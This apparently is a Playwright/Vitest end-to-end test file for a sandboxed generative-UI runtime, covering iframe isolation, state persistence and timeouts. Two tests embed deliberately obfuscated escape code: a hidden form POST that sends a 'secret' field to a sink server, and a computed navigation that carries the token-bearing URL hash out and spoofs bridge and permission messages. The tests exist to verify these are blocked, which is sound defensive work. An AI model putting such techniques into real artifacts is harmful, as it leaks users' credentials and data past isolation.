import { createServer } from 'node:http'
import { mkdir, mkdtemp, rm } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { Context } from '@deepseek-ai/cordis'
import type { Agent } from '@deepseek-ai/dsh-agent'
import { SessionId } from '@deepseek-ai/dsh-session'
import SystemPrompt from '@deepseek-ai/dsh-system-prompt'
import ToolRuntime, { defineTool } from '@deepseek-ai/dsh-tools'
import { chromium } from 'playwright'
import { ArtifactRegistry } from '../src/artifacts/registry.ts'
import { buildArtifact } from '../src/artifacts/builder.ts'
import { cardCss } from '../src/client/styles.ts'
import { BrowserVerifier, mountBridgedPreview, verifyArtifactInBrowser } from './support/browser-verifier.ts'
import { DesignStore } from '../src/designs/store.ts'
import { CapabilityStore } from '../src/runtime/capabilities.ts'
import { createHttpRuntime } from '../src/runtime/server.ts'

const liveIt = process.env.GENUI_LIVE_E2E === '1' ? it : it.skip

describe('sandboxed browser verification', () => {
  let ctx: Context
  let root: string
  let registry: ArtifactRegistry
  let capabilities: CapabilityStore
  let fakeAgent: Agent
  let origin: string
  let previewUrl: string
  let appUrl: string
  let closeServer: () => Promise<void>
  let echoCalls = 0
  let secondSourceCalls = 0
  let pollCalls = 0

  async function capture(page: import('playwright').Page, name: string): Promise<void> {
    const evidenceDir = process.env.GENUI_EVIDENCE_DIR
    if (evidenceDir === undefined) return
    await mkdir(evidenceDir, { recursive: true })
    await page.screenshot({ path: join(evidenceDir, name), fullPage: true })
  }

  beforeAll(async () => {
    ctx = new Context()
    await ctx.plugin(SystemPrompt)
    await ctx.plugin(ToolRuntime)
    ctx.tools.register(defineTool({
      name: 'test_echo',
      description: 'Echo a test message.',
      parameters: { message: { type: 'string', required: true } },
      output: {
        schema: { type: 'object', additionalProperties: false, properties: { echoed: { type: 'string', required: true } } },
        render: (_args, value) => [{ type: 'text', text: value.echoed }],
      },
      async execute(args) {
        echoCalls += 1
        return { echoed: args.message }
      },
    }))
    ctx.tools.register(defineTool({
      name: 'test_second_source',
      description: 'Read a second test source.',
      parameters: {},
      output: {
        schema: { type: 'object', additionalProperties: false, properties: { connected: { type: 'boolean', required: true } } },
        render: (_args, value) => [{ type: 'text', text: String(value.connected) }],
      },
      async execute() {
        secondSourceCalls += 1
        return { connected: true }
      },
    }))
    ctx.tools.register(defineTool({
      name: 'test_poll',
      description: 'Read changing test data.',
      parameters: {},
      output: {
        schema: { type: 'object', additionalProperties: false, properties: { count: { type: 'number', required: true } } },
        render: (_args, value) => [{ type: 'text', text: String(value.count) }],
      },
      async execute() {
        pollCalls += 1
        return { count: pollCalls }
      },
    }))
    root = await mkdtemp(join(tmpdir(), 'dsh-genui-browser-'))
    registry = new ArtifactRegistry(root, 128 * 1024)
    await registry.init()
    const designs = new DesignStore(join(root, '.designs'))
    await designs.init()
    const version = await registry.create({
      id: 'sandbox-state',
      title: 'Sandbox state',
      summary: 'Exercise the SDK through an opaque-origin iframe.',
      requirements: ['Persist state from the isolated preview'],
      capabilities: [],
      files: [
        {
          path: 'src/main.tsx',
          content: `import React, { useEffect } from 'react'
import { createRoot } from 'react-dom/client'
import { useArtifactState } from '@dsh-genui/sdk'
function App() {
  const [count, setCount, status] = useArtifactState('count', 7)
  useEffect(() => { if (status.ready && count === 7) setCount(8) }, [status.ready, count, setCount])
  return <main style={{width:'100%',maxWidth:600}}>{status.error ? status.error.message : 'count:' + count}</main>
}
createRoot(document.getElementById('root')!).render(<App />)`,
        },
      ],
    })
    const built = await buildArtifact(version, registry.distPath(version.artifactId, version.id))
    expect(built.ok).toBe(true)
    await registry.settle(version.artifactId, version.id, {
      checkedAt: new Date().toISOString(), build: 'passed', browser: 'not-run', diagnostics: [], notes: [],
    })

    capabilities = new CapabilityStore()
    fakeAgent = { id: SessionId('browser-e2e'), ctx } as unknown as Agent
    const token = capabilities.issue(version.artifactId, fakeAgent)
    const runtime = createHttpRuntime(ctx, registry, designs, capabilities, '/genui')
    const server = createServer((req, res) => {
      runtime.handler(req, res).catch((error: unknown) => {
        res.writeHead(500)
        res.end(error instanceof Error ? error.message : String(error))
      })
    })
    await new Promise<void>((resolve, reject) => {
      server.once('error', reject)
      server.listen(0, '127.0.0.1', resolve)
    })
    const address = server.address()
    if (address === null || typeof address === 'string') throw new Error('test HTTP server did not bind a TCP port')
    origin = `http://127.0.0.1:${address.port}`
    previewUrl = `${origin}/genui/preview/${version.artifactId}/${version.id}?lang=en#token=${token}`
    appUrl = `${origin}/genui/app/${version.artifactId}?lang=en#token=${token}`
    closeServer = () => new Promise<void>((resolve, reject) => server.close(error => error === undefined ? resolve() : reject(error)))
  }, 60_000)

  afterAll(async () => {
    await closeServer?.()
    await ctx?.fiber.dispose()
    if (root !== undefined) await rm(root, { recursive: true, force: true })
  })

  it('mounts desktop/mobile and persists SDK state from an opaque-origin iframe', async () => {
    const result = await verifyArtifactInBrowser(previewUrl)
    expect(result).toMatchObject({ ok: true, diagnostics: [] })
    await expect.poll(async () => (await registry.readState('sandbox-state', 'browser-e2e'))?.values.count).toBe(8)
    expect(result.notes).toEqual([
      'light desktop mounted at 1280px without horizontal overflow',
      'dark desktop mounted at 1280px without horizontal overflow',
      'reduced-motion desktop mounted at 1280px without horizontal overflow',
      'mobile mounted at 390px without horizontal overflow',
      'compact mobile mounted at 260px without horizontal overflow',
    ])
  }, 60_000)

  it('does not acknowledge an early ready request before the app has mounted', async () => {
    const version = await registry.create({
      id: 'delayed-mount',
      title: 'Delayed mount',
      summary: 'Wait for the initial React surface before reporting readiness.',
      requirements: ['Do not report ready while the root is still empty'],
      capabilities: [],
      files: [{
        path: 'src/main.tsx',
        content: `import React, { useEffect, useState } from 'react'
import { createRoot } from 'react-dom/client'
function App() {
  const [visible, setVisible] = useState(false)
  useEffect(() => { const timer = setTimeout(() => setVisible(true), 250); return () => clearTimeout(timer) }, [])
  return visible ? <main>Mounted after initialization</main> : null
}
createRoot(document.getElementById('root')!).render(<App />)`,
      }],
    })
    const built = await buildArtifact(version, registry.distPath(version.artifactId, version.id))
    expect(built.ok, JSON.stringify(built.diagnostics)).toBe(true)
    await registry.settle(version.artifactId, version.id, {
      checkedAt: new Date().toISOString(), build: 'passed', browser: 'not-run', diagnostics: [], notes: [],
    })
    const token = capabilities.issue(version.artifactId, fakeAgent)
    const browser = await chromium.launch({ headless: true })
    try {
      const page = await browser.newPage()
      await page.addInitScript(({ artifactId, versionId }) => {
        if (self !== top) return
        const state = window as unknown as { readyMessages: number; frameStarted: boolean }
        state.readyMessages = 0
        state.frameStarted = false
        addEventListener('message', event => {
          if (event.data?.source === 'dsh-genui' && event.data?.type === 'ready'
            && event.data.artifactId === artifactId && event.data.versionId === versionId) state.readyMessages += 1
        })
        addEventListener('DOMContentLoaded', () => {
          const frame = document.getElementById('app') as HTMLIFrameElement | null
          if (frame === null) return
          new MutationObserver(() => {
            if (!frame.getAttribute('src') || state.frameStarted) return
            state.frameStarted = true
            frame.contentWindow?.postMessage({ source: 'dsh-genui', type: 'ready-request', artifactId, versionId }, '*')
          }).observe(frame, { attributes: true, attributeFilter: ['src'] })
        })
      }, {
        artifactId: version.artifactId,
        versionId: version.id,
      })
      await page.goto(`${origin}/genui/app/${version.artifactId}?lang=en#token=${token}`)
      await expect.poll(() => page.evaluate(() => (window as unknown as { frameStarted: boolean }).frameStarted)).toBe(true)
      await page.waitForTimeout(120)
      expect(await page.evaluate(() => (window as unknown as { readyMessages: number }).readyMessages)).toBe(0)
      await page.frameLocator('#app').getByText('Mounted after initialization').waitFor({ state: 'visible' })
      await expect.poll(() => page.evaluate(() => (window as unknown as { readyMessages: number }).readyMessages)).toBeGreaterThan(0)
    } finally {
      await browser.close()
    }
  }, 15_000)

  it('reuses one Chromium process while isolating consecutive verifications', async () => {
    let launches = 0
    const verifier = new BrowserVerifier(async () => {
      launches += 1
      return chromium.launch({ headless: true })
    })
    try {
      expect((await verifier.verify(previewUrl)).ok).toBe(true)
      expect((await verifier.verify(previewUrl)).ok).toBe(true)
      expect(launches).toBe(1)
    } finally {
      await verifier.close()
    }
  }, 60_000)

  it('runs the current app at a stable local URL and persists its state', async () => {
    await registry.updateState('sandbox-state', 'browser-e2e', state => ({ ...state, count: 7 }))
    const browser = await chromium.launch({ headless: true })
    try {
      const page = await browser.newPage({ viewport: { width: 1280, height: 800 } })
      await page.goto(appUrl)
      await page.frameLocator('#app').locator('#root > *').first().waitFor({ state: 'visible', timeout: 10_000 })
      expect(await page.locator('#error').isHidden()).toBe(true)
      await expect.poll(async () => (await registry.readState('sandbox-state', 'browser-e2e'))?.values.count).toBe(8)
      expect(page.url()).toBe(appUrl)
    } finally {
      await browser.close()
    }
  }, 30_000)

  it('blocks computed native form submissions in the real sandbox', async () => {
    const sinkRequests: Array<{ method: string; url: string; body: string }> = []
    const sink = createServer(async (req, res) => {
      let body = ''
      for await (const chunk of req) body += String(chunk)
      sinkRequests.push({ method: req.method ?? '', url: req.url ?? '', body })
      res.writeHead(204)
      res.end()
    })
    await new Promise<void>((resolve, reject) => {
      sink.once('error', reject)
      sink.listen(0, '127.0.0.1', resolve)
    })
    const sinkAddress = sink.address()
    if (sinkAddress === null || typeof sinkAddress === 'string') throw new Error('escape sink did not bind a TCP port')
    const sinkOrigin = `http://127.0.0.1:${sinkAddress.port}`
    let browser: Awaited<ReturnType<typeof chromium.launch>> | undefined
    try {
    const version = await registry.create({
      id: 'form-escape-guard',
      title: 'Form escape guard',
      summary: 'Exercise the native form defense after intentionally bypassing the ordinary source patterns.',
      requirements: ['Keep native form submissions inside the sandbox'],
      capabilities: [],
      files: [{
        path: 'src/main.tsx',
        content: `import React, { useState } from 'react'
import { createRoot } from 'react-dom/client'
function App() {
  const [status, setStatus] = useState('ready')
  const tryForm = () => {
    const unsafeDocument = document as any
    const form = unsafeDocument['create' + 'Element']('form') as HTMLFormElement
    form['method'] = 'POST'
    ;(form as any)['act' + 'ion'] = '${sinkOrigin}/collect-form'
    const input = unsafeDocument['create' + 'Element']('input') as HTMLInputElement
    input.name = 'secret'
    input.value = 'form-bypass'
    form.append(input)
    document.body.append(form)
    ;(form as any)['sub' + 'mit']()
    setStatus('form blocked')
  }
  return <main><h1>Form probe</h1><button data-genui-primary-action onClick={tryForm}>Try form escape</button><p>{status}</p></main>
}
createRoot(document.getElementById('root')!).render(<App />)`,
      }],
    })
    const built = await buildArtifact(version, registry.distPath(version.artifactId, version.id))
    expect(built.ok, JSON.stringify(built.diagnostics)).toBe(true)
    await registry.settle(version.artifactId, version.id, {
      checkedAt: new Date().toISOString(), build: 'passed', browser: 'not-run', diagnostics: [], notes: [],
    })
    const token = capabilities.issue(version.artifactId, fakeAgent)
    browser = await chromium.launch({ headless: true })
      const page = await browser.newPage()
      const url = `${origin}/genui/app/${version.artifactId}?lang=en#token=${token}`
      await page.goto(url)
      const app = page.frameLocator('#app')
      await app.getByText('Form probe', { exact: true }).waitFor({ state: 'visible' })
      expect(await page.locator('#app').getAttribute('sandbox')).toBe('allow-scripts allow-modals')

      await app.getByRole('button', { name: 'Try form escape' }).click()
      await app.getByText('form blocked', { exact: true }).waitFor({ state: 'visible' })
      await page.waitForTimeout(250)
      expect(sinkRequests).toEqual([])
      expect(page.url()).toBe(url)
    } finally {
      await browser?.close()
      sink.closeAllConnections()
      await new Promise<void>((resolve, reject) => sink.close(error => error === undefined ? resolve() : reject(error)))
    }
  }, 30_000)

  it('keeps the real capability and bridge behind a committed self-navigation', async () => {
    const sinkRequests: Array<{ method: string; url: string; body: string; authorization?: string }> = []
    const sink = createServer(async (req, res) => {
      let body = ''
      for await (const chunk of req) body += String(chunk)
      sinkRequests.push({
        method: req.method ?? '', url: req.url ?? '', body,
        ...(typeof req.headers.authorization === 'string' ? { authorization: req.headers.authorization } : {}),
      })
      if (req.url?.startsWith('/landing') === true) {
        const target = new URL(req.url, 'http://sink.invalid')
        const artifactId = target.searchParams.get('artifact') ?? ''
        const versionId = target.searchParams.get('version') ?? ''
        const nonce = target.searchParams.get('nonce') ?? ''
        res.writeHead(200, { 'content-type': 'text/html; charset=utf-8', 'access-control-allow-origin': '*' })
        res.end(`<!doctype html><main>External navigation committed</main><script>
          const channel = new MessageChannel()
          let receivedPort = false
          channel.port1.onmessage = () => { receivedPort = true; new Image().src = '/report?port=1' }
          parent.postMessage({ source: 'dsh-genui', type: 'bridge-connect', bridgeVersion: 1,
            nonce: ${JSON.stringify(nonce)}, artifactId: ${JSON.stringify(artifactId)}, versionId: ${JSON.stringify(versionId)} }, '*', [channel.port2])
          parent.postMessage({ source: 'dsh-genui', type: 'runtime-error', artifactId: ${JSON.stringify(artifactId)}, versionId: ${JSON.stringify(versionId)} }, '*')
          parent.postMessage({ source: 'dsh-genui', type: 'permission-request', requestId: 'external-spoof',
            artifactId: ${JSON.stringify(artifactId)}, versionId: ${JSON.stringify(versionId)},
            permission: { id: 'escape-capability', kind: 'tool', label: 'Spoofed', reason: 'Spoofed', access: 'write' } }, '*')
          setTimeout(() => { if (!receivedPort) new Image().src = '/report?port=0' }, 350)
        </script>`)
        return
      }
      res.writeHead(204, { 'access-control-allow-origin': '*' })
      res.end()
    })
    await new Promise<void>((resolve, reject) => {
      sink.once('error', reject)
      sink.listen(0, '127.0.0.1', resolve)
    })
    const address = sink.address()
    if (address === null || typeof address === 'string') throw new Error('navigation sink did not bind')
    const sinkOrigin = `http://127.0.0.1:${address.port}`
    let browser: Awaited<ReturnType<typeof chromium.launch>> | undefined
    try {
      const version = await registry.create({
        id: 'navigation-token-boundary',
        title: 'Navigation token boundary',
        summary: 'Commit a computed cross-origin navigation after the trusted bootstrap starts the app.',
        requirements: ['Do not transfer host credentials or a second bridge'],
        capabilities: [{
          id: 'escape-capability', kind: 'tool', label: 'Change protected data',
          reason: 'Exercise the permission spoof boundary.', access: 'write', tool: 'test_echo',
        }],
        files: [{
          path: 'src/main.tsx',
          content: `const root = document.getElementById('root')!
const fragment = new URLSearchParams(location.hash.slice(1))
const target = new URL('${sinkOrigin}/landing')
target.searchParams.set('artifact', root.dataset.artifactId || '')
target.searchParams.set('version', root.dataset.versionId || '')
target.searchParams.set('seenHash', location.hash)
target.searchParams.set('nonce', fragment.get('bridge_nonce') || '')
;(globalThis as any)['loc' + 'ation']['hr' + 'ef'] = target.toString()`,
        }],
      })
      const built = await buildArtifact(version, registry.distPath(version.artifactId, version.id))
      expect(built.ok, JSON.stringify(built.diagnostics)).toBe(true)
      await registry.settle(version.artifactId, version.id, {
        checkedAt: new Date().toISOString(), build: 'passed', browser: 'not-run', diagnostics: [], notes: [],
      })
      const token = capabilities.issue(version.artifactId, fakeAgent)
      browser = await chromium.launch({ headless: true })
      const page = await browser.newPage()
      let runtimeFailureRequests = 0
      const browserDiagnostics: string[] = []
      page.on('console', message => browserDiagnostics.push(`${message.type()}: ${message.text()}`))
      page.on('pageerror', error => browserDiagnostics.push(`pageerror: ${error.message}`))
      page.on('requestfailed', request => browserDiagnostics.push(`requestfailed: ${request.url()} ${request.failure()?.errorText ?? ''}`))
      page.on('request', request => {
        if (new URL(request.url()).pathname.endsWith('/version/report-runtime-failure')) runtimeFailureRequests += 1
      })
      const parentUrl = `${origin}/genui/not-found`
      await page.goto(parentUrl)
      await mountBridgedPreview(page, `${origin}/genui/preview/${version.artifactId}/${version.id}?lang=en#token=${token}`, 'navigation attack')
      await page.waitForTimeout(750)
      expect(sinkRequests.some(item => item.url.startsWith('/landing')), JSON.stringify({
        sinkRequests,
        frames: page.frames().map(frame => frame.url()),
        browserDiagnostics,
      })).toBe(true)
      await expect.poll(() => sinkRequests.some(item => item.url.startsWith('/report?port=0')), { timeout: 5_000 }).toBe(true)
      expect(sinkRequests.some(item => item.url.startsWith('/report?port=1'))).toBe(false)
      expect(page.url()).toBe(parentUrl)
      expect(runtimeFailureRequests).toBe(0)
      expect(await page.locator('dialog').count()).toBe(0)
      const leaked = JSON.stringify(sinkRequests)
      expect(leaked).not.toContain(token)
      expect(leaked).toContain('token%3Dbridge-v1')
      const replay = await fetch(`${origin}/genui/api/${version.artifactId}/state/read`, {
        method: 'POST',
        headers: { authorization: 'Bearer bridge-v1', 'content-type': 'application/json', origin: 'null' },
        body: JSON.stringify({ key: 'probe', version_id: version.id }),
      })
      expect(replay.status).toBe(401)
      expect((await registry.get(version.artifactId)).currentVersionId).toBe(version.id)
      expect(await registry.readState(version.artifactId, String(fakeAgent.id))).toBeUndefined()
    } finally {
      await browser?.close()
      sink.closeAllConnections()
      await new Promise<void>((resolve, reject) => sink.close(error => error === undefined ? resolve() : reject(error)))
    }
  }, 30_000)

  it('confirms a user choice only after saving it and restores it after reload', async () => {
    const version = await registry.create({
      id: 'weekend-choice',
      title: 'Weekend route',
      summary: 'Keep a route choice with the current task.',
      requirements: ['Let the user make the riverside walk optional'],
      capabilities: [],
      files: [{
        path: 'src/main.tsx',
        content: `import React from 'react'
import { createRoot } from 'react-dom/client'
import { useArtifactState } from '@dsh-genui/sdk'
function App() {
  const [optional, setOptional, status] = useArtifactState('riversideOptional', false)
  if (!status.ready) return <main>Opening your plan...</main>
  return <main><p>Riverside walk: {optional ? 'optional' : 'planned'}</p><button data-genui-primary-action onClick={() => setOptional(value => !value)}>Make it optional</button>{status.error ? <p role="alert">Could not save this choice.</p> : null}</main>
}
createRoot(document.getElementById('root')!).render(<App />)`,
      }],
    })
    const built = await buildArtifact(version, registry.distPath(version.artifactId, version.id))
    expect(built.ok, JSON.stringify(built.diagnostics)).toBe(true)
    await registry.settle(version.artifactId, version.id, {
      checkedAt: new Date().toISOString(), build: 'passed', browser: 'not-run', diagnostics: [], notes: [],
    })
    const token = capabilities.issue(version.artifactId, fakeAgent)
    const url = `${origin}/genui/app/${version.artifactId}?lang=en#token=${token}`
    const browser = await chromium.launch({ headless: true })
    try {
      const page = await browser.newPage({ viewport: { width: 1280, height: 800 } })
      await page.goto(url)
      const app = page.frameLocator('#app')
      await app.getByRole('button', { name: 'Make it optional' }).click()
      await page.getByText('Saved', { exact: true }).waitFor({ state: 'visible' })
      await expect.poll(async () => (await registry.readState(version.artifactId, String(fakeAgent.id)))?.values.riversideOptional).toBe(true)
      await capture(page, '01-weekend-choice-saved.png')

      await page.reload()
      await app.getByText('Riverside walk: optional').waitFor({ state: 'visible' })
      await capture(page, '02-weekend-choice-reopened.png')
    } finally {
      await browser.close()
    }
  }, 30_000)

  it('serializes rapid repeated state values and restores the final choice', async () => {
    const version = await registry.create({
      id: 'rapid-choice',
      title: 'Rapid choice',
      summary: 'Keep the final value when one interaction queues several state updates.',
      requirements: ['Persist the last choice in event order'],
      capabilities: [],
      files: [{
        path: 'src/main.tsx',
        content: `import React from 'react'
import { createRoot } from 'react-dom/client'
import { useArtifactState } from '@dsh-genui/sdk'
function App() {
  const [choice, setChoice, status] = useArtifactState('choice', 'initial')
  if (!status.ready) return <main>Opening choices…</main>
  return <main><button data-genui-primary-action onClick={() => { setChoice('A'); setChoice('B'); setChoice('A') }}>Apply rapid choices</button><p>Choice: {choice}</p></main>
}
createRoot(document.getElementById('root')!).render(<App />)`,
      }],
    })
    const built = await buildArtifact(version, registry.distPath(version.artifactId, version.id))
    expect(built.ok, JSON.stringify(built.diagnostics)).toBe(true)
    await registry.settle(version.artifactId, version.id, {
      checkedAt: new Date().toISOString(), build: 'passed', browser: 'not-run', diagnostics: [], notes: [],
    })
    const token = capabilities.issue(version.artifactId, fakeAgent)
    const url = `${origin}/genui/app/${version.artifactId}?lang=en#token=${token}`
    const browser = await chromium.launch({ headless: true })
    try {
      const page = await browser.newPage()
      let stateWrites = 0
      page.on('request', request => {
        if (new URL(request.url()).pathname.endsWith('/state/write')) stateWrites += 1
      })
      await page.goto(url)
      const app = page.frameLocator('#app')
      await app.getByRole('button', { name: 'Apply rapid choices' }).click()
      await app.getByText('Choice: A', { exact: true }).waitFor({ state: 'visible' })
      await expect.poll(async () => (await registry.readState(version.artifactId, String(fakeAgent.id)))?.values.choice).toBe('A')
      expect(stateWrites).toBeLessThanOrEqual(2)
      await page.reload()
      await app.getByText('Choice: A', { exact: true }).waitFor({ state: 'visible' })
    } finally {
      await browser.close()
    }
  }, 30_000)

  it('waits for a pending write before re-reading a dynamic state key', async () => {
    const version = await registry.create({
      id: 'dynamic-state-key',
      title: 'Dynamic state key',
      summary: 'Keep a freshly written value while switching keys.',
      requirements: ['Read the latest persisted value when returning to a key'],
      capabilities: [],
      files: [{
        path: 'src/main.tsx',
        content: `import React, { useState } from 'react'
import { createRoot } from 'react-dom/client'
import { useArtifactState } from '@dsh-genui/sdk'
function App() {
  const [slot, setSlot] = useState('A')
  const [value, setValue, status] = useArtifactState('slot-' + slot, 'empty')
  if (!status.ready) return <main>Opening {slot}…</main>
  return <main><button data-genui-primary-action onClick={() => {
    setValue('fresh-A')
    setSlot('B')
    setTimeout(() => setSlot('A'), 20)
  }}>Switch away and back</button><p>Slot {slot}: {value}</p></main>
}
createRoot(document.getElementById('root')!).render(<App />)`,
      }],
    })
    const built = await buildArtifact(version, registry.distPath(version.artifactId, version.id))
    expect(built.ok, JSON.stringify(built.diagnostics)).toBe(true)
    await registry.settle(version.artifactId, version.id, {
      checkedAt: new Date().toISOString(), build: 'passed', browser: 'not-run', diagnostics: [], notes: [],
    })
    await registry.updateState(version.artifactId, String(fakeAgent.id), () => ({ 'slot-A': 'old-A', 'slot-B': 'old-B' }))
    const token = capabilities.issue(version.artifactId, fakeAgent)
    const browser = await chromium.launch({ headless: true })
    try {
      const page = await browser.newPage()
      await page.goto(`${origin}/genui/app/${version.artifactId}?lang=en#token=${token}`)
      const app = page.frameLocator('#app')
      await app.getByText('Slot A: old-A', { exact: true }).waitFor({ state: 'visible' })
      await app.getByRole('button', { name: 'Switch away and back' }).click()
      await app.getByText('Slot A: fresh-A', { exact: true }).waitFor({ state: 'visible' })
      expect((await registry.readState(version.artifactId, String(fakeAgent.id)))?.values['slot-A']).toBe('fresh-A')
    } finally {
      await browser.close()
    }
  }, 30_000)

  it('times out a stalled state write and continues with the latest queued value', async () => {
    const version = await registry.create({
      id: 'stalled-state-write',
      title: 'Stalled state write',
      summary: 'Continue saving after a request stalls.',
      requirements: ['Do not leave later state writes blocked forever'],
      capabilities: [],
      files: [{
        path: 'src/main.tsx',
        content: `import React from 'react'
import { createRoot } from 'react-dom/client'
import { useArtifactState } from '@dsh-genui/sdk'
function App() {
  const [value, setValue, status] = useArtifactState('resilient', 'initial')
  if (!status.ready) return <main>Opening…</main>
  return <main><button data-genui-primary-action onClick={() => {
    setValue('first')
    setTimeout(() => setValue('latest'), 20)
  }}>Save twice</button><p>Value: {value}</p><p>{status.saving ? 'Saving' : 'Idle'}</p></main>
}
createRoot(document.getElementById('root')!).render(<App />)`,
      }],
    })
    const built = await buildArtifact(version, registry.distPath(version.artifactId, version.id))
    expect(built.ok, JSON.stringify(built.diagnostics)).toBe(true)
    await registry.settle(version.artifactId, version.id, {
      checkedAt: new Date().toISOString(), build: 'passed', browser: 'not-run', diagnostics: [], notes: [],
    })
    const token = capabilities.issue(version.artifactId, fakeAgent)
    const browser = await chromium.launch({ headless: true })
    try {
      const page = await browser.newPage()
      let stateWrites = 0
      await page.route('**/state/write', async route => {
        stateWrites += 1
        if (stateWrites !== 1) {
          await route.continue()
          return
        }
        await new Promise(resolve => setTimeout(resolve, 10_500))
        await route.continue().catch(() => undefined)
      })
      await page.goto(`${origin}/genui/app/${version.artifactId}?lang=en#token=${token}`)
      const app = page.frameLocator('#app')
      await app.getByRole('button', { name: 'Save twice' }).click()
      await app.getByText('Value: latest', { exact: true }).waitFor({ state: 'visible' })
      await expect.poll(async () => (await registry.readState(version.artifactId, String(fakeAgent.id)))?.values.resilient, {
        timeout: 15_000,
      }).toBe('latest')
      await app.getByText('Idle', { exact: true }).waitFor({ state: 'visible' })
      expect(stateWrites).toBe(2)
    } finally {
      await browser.close()
    }
  }, 25_000)

  it('does not apply the short state timeout to slower connected actions', async () => {
    const version = await registry.create({
      id: 'slow-connected-actions',
      title: 'Slow connected actions',
      summary: 'Keep normal host time budgets for tools and external requests.',
      requirements: ['Allow connected actions to use the host timeout budget'],
      capabilities: [
        { id: 'slow-tool', kind: 'tool', label: 'Run the slow tool', reason: 'Wait for a valid connected tool result.', access: 'read', tool: 'test_echo' },
        { id: 'slow-external', kind: 'external', label: 'Read the slow service', reason: 'Wait for a valid external response.', access: 'read', urlPrefix: 'https://api.example.com/v1/status', methods: ['GET'] },
      ],
      files: [{
        path: 'src/main.tsx',
        content: `import React, { useState } from 'react'
import { createRoot } from 'react-dom/client'
import { callTool, requestExternal } from '@dsh-genui/sdk'
function App() {
  const [status, setStatus] = useState('Ready')
  const run = async () => {
    setStatus('Waiting')
    try {
      await Promise.all([
        callTool('test_echo', { message: 'slow' }),
        requestExternal('https://api.example.com/v1/status'),
      ])
      setStatus('Connected actions completed')
    } catch { setStatus('Connected actions failed') }
  }
  return <main><button data-genui-primary-action onClick={() => { void run() }}>Run connected actions</button><p>{status}</p></main>
}
createRoot(document.getElementById('root')!).render(<App />)`,
      }],
    })
    const built = await buildArtifact(version, registry.distPath(version.artifactId, version.id))
    expect(built.ok, JSON.stringify(built.diagnostics)).toBe(true)
    await registry.settle(version.artifactId, version.id, {
      checkedAt: new Date().toISOString(), build: 'passed', browser: 'not-run', diagnostics: [], notes: [],
    })
    const verificationToken = capabilities.issue(version.artifactId, fakeAgent, 'verification')
    const browser = await chromium.launch({ headless: true })
    try {
      const page = await browser.newPage()
      const delayed = async (route: import('playwright').Route) => {
        await new Promise(resolve => setTimeout(resolve, 10_500))
        await route.fulfill({ status: 200, contentType: 'application/json', body: '{}' }).catch(() => undefined)
      }
      await page.route('**/tool', delayed)
      await page.route('**/external', delayed)
      await page.goto(`${origin}/genui/app/${version.artifactId}?lang=en#token=${verificationToken}`)
      await page.getByRole('button', { name: 'Not now' }).click()
      const app = page.frameLocator('#app')
      await app.getByRole('button', { name: 'Run connected actions' }).click()
      await app.getByText('Connected actions completed', { exact: true }).waitFor({ state: 'visible', timeout: 15_000 })
    } finally {
      await browser.close()
    }
  }, 25_000)

  it('keeps a code-first causal model interactive across reloads and narrow screens', async () => {
    const version = await registry.create({
      id: 'season-model',
      title: 'Why seasons reverse',
      summary: 'Move Earth around its orbit and compare the changing light relationship.',
      requirements: ['Show orbital position, axial tilt, and the changing hemisphere relationship together'],
      capabilities: [],
      files: [{
        path: 'src/main.tsx',
        content: `import React from 'react'
import { createRoot } from 'react-dom/client'
import { useArtifactState } from '@dsh-genui/sdk'
import './styles.css'
const positions = [{ name: 'June', x: 390, y: 150, north: 'longer days' }, { name: 'September', x: 260, y: 250, north: 'similar day length' }, { name: 'December', x: 130, y: 150, north: 'shorter days' }, { name: 'March', x: 260, y: 50, north: 'similar day length' }]
function App() {
  const [phase, setPhase, status] = useArtifactState('orbitalPhase', 0)
  const point = positions[phase] || positions[0]
  if (!status.ready) return <main>Opening model...</main>
  return <main><header><p>Seasons, one relationship at a time</p><h1>Distance is not the switch.</h1></header><div className="model"><svg viewBox="0 0 520 300" role="img" aria-label={'Earth at the ' + point.name + ' position'}><ellipse cx="260" cy="150" rx="160" ry="100"/><circle className="sun" cx="260" cy="150" r="38"/><g transform={'translate(' + point.x + ' ' + point.y + ')'}><circle className="earth" r="24"/><line className="axis" x1="-11" y1="-34" x2="11" y2="34"/><path className="north" d="M0,-24 A24,24 0 0,1 20,-13"/></g></svg><aside><span>{point.name} position</span><strong>Northern hemisphere: {point.north}</strong><p>The axis keeps pointing the same way as Earth moves.</p></aside></div><label htmlFor="orbit">Move Earth around its orbit</label><input id="orbit" data-genui-primary-action type="range" min="0" max="3" step="1" value={phase} onChange={event => setPhase(Number(event.target.value))}/>{status.error ? <p role="alert">Could not save this position.</p> : null}</main>
}
createRoot(document.getElementById('root')!).render(<App />)`,
      }, {
        path: 'src/styles.css',
        content: `:root{color-scheme:light dark;font-family:"Trebuchet MS",sans-serif;background:#081b24;color:#edf7f4}*{box-sizing:border-box}body{margin:0;background:radial-gradient(circle at 50% 45%,#244e57 0,transparent 42%),linear-gradient(145deg,#07171f,#102a31)}main{width:min(880px,calc(100% - 28px));margin:auto;padding:34px 0}header p{margin:0;color:#e6bc5a;font-size:12px;font-weight:800;letter-spacing:.12em;text-transform:uppercase}h1{margin:7px 0 20px;font:500 clamp(36px,7vw,64px)/1 Georgia,serif;letter-spacing:-.04em}.model{display:grid;grid-template-columns:minmax(0,1.5fr) minmax(220px,.7fr);gap:20px;align-items:center;border:1px solid #d8ece833;border-radius:22px;padding:18px;background:#07131999;box-shadow:0 30px 80px #0005}svg{width:100%;min-height:260px}ellipse{fill:none;stroke:#b6d3d366;stroke-width:2}.sun{fill:#e5af3f;filter:drop-shadow(0 0 18px #f0bd4b88)}.earth{fill:#4f9dac;stroke:#d4f3ef;stroke-width:2}.axis{stroke:#f7d36f;stroke-width:4;stroke-linecap:round}.north{fill:none;stroke:#f7d36f;stroke-width:5}aside{border-left:1px solid #d8ece833;padding-left:20px}aside span{color:#e6bc5a;font-size:12px;font-weight:800;text-transform:uppercase}aside strong{display:block;margin:10px 0;font:500 24px/1.2 Georgia,serif}aside p{margin:0;color:#acc2c1;font-size:13px;line-height:1.5}label{display:block;margin-top:22px;font-weight:800}input{width:100%;margin-top:12px;accent-color:#e6bc5a}input:focus-visible{outline:3px solid #e6bc5a;outline-offset:5px}@media(max-width:620px){main{padding-top:24px}.model{grid-template-columns:1fr;padding:12px}svg{min-height:220px}aside{border-top:1px solid #d8ece833;border-left:0;padding:16px 4px 4px}aside strong{font-size:21px}}`,
      }],
    })
    const built = await buildArtifact(version, registry.distPath(version.artifactId, version.id))
    expect(built.ok, JSON.stringify(built.diagnostics)).toBe(true)
